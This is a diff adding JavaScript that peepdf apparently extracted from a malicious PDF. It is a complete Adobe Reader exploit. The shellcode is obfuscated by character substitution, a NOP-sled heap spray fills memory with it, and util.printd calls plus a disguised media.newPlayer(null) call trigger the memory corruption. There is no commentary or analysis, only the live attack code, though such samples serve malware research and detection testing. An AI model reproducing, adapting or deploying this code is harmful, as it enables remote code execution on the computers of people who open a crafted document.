@@ -1,0 +1,51 @@
+// peepdf comment: Javascript code located in object 28 (version 1)
+
+function urpl(sc) {
+    var keyu = "u";
+    var re = /Z/g;
+    sc = sc.replace(re, keyu);
+    return sc;
+}
+
+function StringBuffer() {
+    this._strings = new Array;
+}
+
+StringBuffer.prototype.append = function(str) {
+    this._strings.push(str);
+    return this;
+}
+
+StringBuffer.prototype.toString = function() {
+    return this._strings.join("");
+}
+
+
+StringBuffer.prototype.length = function() {
+    var str = this._strings.join("");
+    return str.length;
+}
+var unes = unescape;
+var a = "med";
+var c = "ia";
+var b = "newPlay";
+var d = "er";
+var sc = unes(urpl("%Zc8d9%Z74d9%Zf424%Ze7ba%Zbcdb%Z29bb%Z5fc9%Z9fb1%Z5731%Z8314%Z2708%Z435e%Z376c%Z573d%Zd8e7%Zbbbc%Z930f%Zbbbe%Z52e7%Z4ff9%Zae18%Zd348%Z11d4%Ze036%Z3b0f%Zbbbd%Z52e7%Z57f9%Zae18%Zd348%Zd8a8%Z047b%Z0b0f%Zbbbd%Z52e7%Z53f9%Zae18%Zd348%Zcc42%Zc7bc%Z1b0f%Zbbbd%Z52e7%Z5ff9%Zae18%Zd348%Z404a%Z64c1%Z6b0f%Zbbbd%Z52e7%Z5bf9%Zae18%Zd348%Zd34b%Zcd66%Z7b0f%Zbbbd%Z52e7%Z67f9%Zae18%Zd348%Zbef1%Zab46%Z4b0f%Zbbbd%Z52e7%Z63f9%Zae18%Zd348%Za2f8%Z53b6%Z5b0f%Zbbbd%Z52e7%Z6ff9%Zae18%Zd348%Z4c1c%Zb441%Zab0f%Zbbbd%Z52e7%Z77f9%Zae18%Zd348%Z4c0b%Zb7bf%Zbb0f%Zbbbd%Z52e7%Z03f9%Zae18%Zd348%Zf911%Zc705%Z8b0f%Zbbbd%Z52e7%Z0ff9%Zae18%Zd348%Z6264%Zc309%Z9b0f%Zbbbd%Z52e7%Z17f9%Zae18%Zd348%Zcc01%Zc033%Zeb0f%Zbbbd%Z52e7%Z7ff9%Zae18%Zd348%Z257f%Zb536%Zfb0f%Zbbbd%Z52e7%Z7bf9%Z2dd4%Z7d3f%Z56e3%Z1bf9%Z8db7%Zee43%Ze607%Z2c6f%Zdbe4%Z55c9%Zae6e%Z321c%Z27a2%Z3025%Z27aa%Ze9ed%Z8e18%Z3204%Z73a2%Ze925%Z89b5%Zce43%Z2447%Z67e9%Z866a%Z222c%Z88b5%Zce43%Z241b%Z13c9%Zae18%Z441c%Z03b2%Zfe37%Z9b4f%Z833d%Zf5a1%Zd3e6%Z2c92%Zc33d%Zf8e3%Z3aba%Zaefe%Z3652%Zd797%Zfb37%Z52ef%Z43f9%Zae6e%Z3618%Zdb62%Z4442%Z8b18%Z2bd4%Zdbe6%Z44bc%Z37b2%Z3e31%Z25e7%Z4443%Z24b7%Z53e9%Z5e20%Z45bc%Z2418%Zd8fd%Z8995%Z3e7b%Z25e3%Z4443%Ze883%Z958e%Z5e20%Z45b4%Z2418%Ze3f9%Zdba2%Zbbd6%Zd98d%Zbfd6%Zdb8d%Zb8d6%Zdb8f%Zbbbc%Z56a7%Zbb39%Z2419%Zeb43%Z8e18%Z3258%Z47a2%Zce37%Z5043%Z3042%Z23aa%Z16dc%Z2364%Zcfbc%Zeee2%Z6160%Z013b%Zf217%Z92ae%Z545e%Z4286%Ze8ee%Zae18%Zed44%Zae18%Z4420%Z0fb2%Z44ea%Z6fb2%Zce43%Z247b%Z77e9%Z5e20%Z45bc%Z2418%Zd8fd%Z8995%Z3e7b%Z25e3%Z4443%Ze883%Z958e%Z5e20%Z45b4%Z2418%Ze3f9%Zdba2%Zbbd6%Z5e6a%Z45bc%Z2418%Z2bec%Z2477%Z7be9%Z8e18%Zd178%Z8be7%Zee43%Z884b%Zede9%Z50b0%Z9fd0%Z50ff%Z87f9%Z8f6c%Zc3b9%Z0ee4%Zf137%Z50ff%Z9be6%Z06e4%Z895f%Z50ae%Z3088%Z2ee4%Z448f%Ze81b%Z177c%Z1fdd%Zbcc8%Z1426%Zb8b1%Z301f%Z804e%Zff9b%Zcea8%Z5006%Z9fe6%Z06e4%Z30da%Z90eb%Ze137%Zd8fb%Z3061%Z50e3%Z7ebf%Zd90c%Z7b8f%Z0e6c%Ze5e3%Z80ba%Zb37e%Z8de7%Z1ad8%Zdbd7%Zbbbc%Z1b62%Zb7c4%Z9b6c%Z30b0%Zc797%Z3011%Zd3a7%Zb257%Z9b6c%Z3088%Z6367%Zbbbc%Z85e7%Z2b7f"));
+var nop = unes("%u484a%uf999");
+
+var buffer = new StringBuffer();
+while (nop["length"] <= 35000) {
+    buffer.append(nop);
+    buffer.append(nop);
+    nop = buffer.toString();
+}
+nop = nop["substring"](0, 35000 - sc["length"]);
+memory = new Array();
+for (i = 0; i < 0xE00; i++) memory[i] = nop + sc;
+util.printd("p@111111111111111111111111 : yyyy111", new Date());
+util.printd("p@111111111111111111111111 : yyyy111", new Date());
+try {
+    this[a + c][b + d](null);
+} catch (e) {}
+util.printd("p@111111111111111111111111 : yyyy111", new Date());
+
